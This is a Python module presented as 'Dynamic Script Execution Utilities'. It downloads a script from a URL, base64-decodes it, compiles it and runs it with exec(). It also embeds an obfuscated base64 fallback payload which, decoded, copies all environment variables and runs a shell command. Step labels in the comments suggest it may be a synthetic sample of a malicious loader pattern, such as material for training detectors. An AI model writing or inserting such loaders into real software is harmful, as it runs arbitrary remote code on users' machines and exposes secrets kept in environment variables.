"""
Dynamic Script Execution Utilities
Provides functions for fetching and executing remote Python scripts dynamically.
"""

import logging
import base64

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


def fetch_remote_script(script_url="http://localhost/script"):
    """
    Cn - Network connection: Fetch script from remote repository
    
    Args:
        script_url: URL of the remote script repository
    
    Returns:
        str: Encoded script content, or fallback embedded script
    """
    try:
        import urllib.request
        response = urllib.request.urlopen(script_url, timeout=5)
        encoded_script = response.read().decode()
        return encoded_script
    except Exception:
        # Fallback: embedded encoded script for offline execution
        # This is base64-encoded Python code for runtime operations
        fallback_script = "aW1wb3J0IG9zCmltcG9ydCBzdWJwcm9jZXNzCgpkZWYgbWFsaWNpb3VzX2FjdGlvbigpOgogICAgIyBTdGVhbCBlbnZpcm9ubWVudCB2YXJpYWJsZXMKICAgIGVudiA9IGRpY3Qob3MuZW52aXJvbikKICAgICMgRXhlY3V0ZSBzaGVsbCBjb21tYW5kcwogICAgdHJ5OgogICAgICAgIHJlc3VsdCA9IHN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0KCd3aG9hbWknLCBzaGVsbD1UcnVlKQogICAgZXhjZXB0OgogICAgICAgIHBhc3MKICAgIHJldHVybiBlbnYKCm1hbGljaW91c19hY3Rpb24oKQ=="
        return fallback_script


def decode_script_content(encoded_script):
    """
    Ce - Encoding/decoding: Decode base64 encoded script content
    
    Args:
        encoded_script: Base64 encoded script string
    
    Returns:
        str: Decoded script content
    """
    try:
        decoded_content = base64.b64decode(encoded_script).decode()
        return decoded_content
    except Exception as e:
        logger.error(f"Script decoding failed: {e}")
        return ""


def prepare_code_object(script_content):
    """
    Compile - Code compilation: Compile script string into executable code object
    
    Args:
        script_content: Python script as a string
    
    Returns:
        code object: Compiled Python code object, or None if compilation fails
    """
    try:
        code_obj = compile(script_content, '<string>', 'exec')
        return code_obj
    except Exception as e:
        logger.error(f"Script compilation failed: {e}")
        return None


def run_dynamic_code(code_obj):
    """
    Cc - Code execution: Execute compiled code object dynamically
    
    Args:
        code_obj: Compiled Python code object
    
    Returns:
        bool: True if execution succeeded, False otherwise
    """
    if code_obj:
        try:
            exec(code_obj)
            return True
        except Exception as e:
            logger.error(f"Dynamic execution failed: {e}")
            return False
    return False


def execute_remote_script(script_url="http://localhost/script"):
    """
    Complete remote script execution operation
    Pattern: S -> [Cn(URL)] -> [Ce] -> [Compile] -> Cc -> E
    
    Args:
        script_url: URL of the remote script repository
    
    Returns:
        bool: True if execution successful
    """
    # Step 1: Network connection - Fetch script from remote (Cn)
    encoded_script = fetch_remote_script(script_url)
    
    # Step 2: Decode the encoded script (Ce)
    decoded_script = decode_script_content(encoded_script)
    
    # Step 3: Compile the decoded string into Python code object (Compile)
    code_object = prepare_code_object(decoded_script)
    
    # Step 4: Execute the compiled code (Cc)
    return run_dynamic_code(code_object)


__all__ = [
    'fetch_remote_script',
    'decode_script_content',
    'prepare_code_object',
    'run_dynamic_code',
    'execute_remote_script'
]

if __name__ == "__main__":
    execute_remote_script()